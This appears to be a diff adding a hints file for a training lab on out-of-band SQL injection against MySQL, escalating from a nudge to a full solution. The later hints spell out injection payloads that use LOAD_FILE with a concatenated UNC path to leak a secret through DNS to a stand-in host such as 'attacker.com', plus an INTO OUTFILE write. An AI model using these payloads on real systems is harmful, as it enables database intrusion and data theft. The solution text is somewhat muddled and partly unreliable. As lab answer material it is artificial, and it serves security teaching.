@@ -1,0 +1,30 @@
+{
+  "labId": "sqli-15-oast",
+  "hints": [
+    {
+      "level": 1,
+      "title": "Nudge",
+      "content": "No data comes back in the response, and time-based attacks are blocked. But the database server can talk to the outside world. Can you make it send data somewhere you're listening?"
+    },
+    {
+      "level": 2,
+      "title": "Direction",
+      "content": "The lab has a built-in webhook catcher at /webhook that logs all incoming requests. If you can make the MySQL server fetch a URL that includes the flag data, you can see it in the webhook logs."
+    },
+    {
+      "level": 3,
+      "title": "Approach",
+      "content": "MySQL's LOAD_FILE() can sometimes trigger DNS lookups. More reliably in this lab, the web container can make HTTP requests. Try using a subquery to create a URL and trigger a request to the webhook."
+    },
+    {
+      "level": 4,
+      "title": "Near-solution",
+      "content": "The app processes the query result even though it doesn't display it. Use: 1 UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\webhook.', (SELECT secret FROM oast_secrets LIMIT 1), '.attacker.com\\\\a')) — or use the built-in /webhook endpoint with the INTO OUTFILE trick to write data that the app can read."
+    },
+    {
+      "level": 5,
+      "title": "Solution",
+      "content": "This lab uses a simplified OAST approach: 1) Use the injection to write the flag to a known file: 1; SELECT secret FROM oast_secrets INTO OUTFILE '/tmp/exfil.txt' — but stacked queries may not work. 2) Alternative: UNION-based approach with LOAD_FILE for DNS: 0 UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',HEX((SELECT secret FROM oast_secrets LIMIT 1)),'.your-domain\\\\a')),2,3. 3) Simplest path: the /webhook endpoint catches requests. Use browser/curl to verify: GET /webhook/logs shows captured requests. Then inject to read the secret via error-based or find another channel to /webhook."
+    }
+  ]
+}
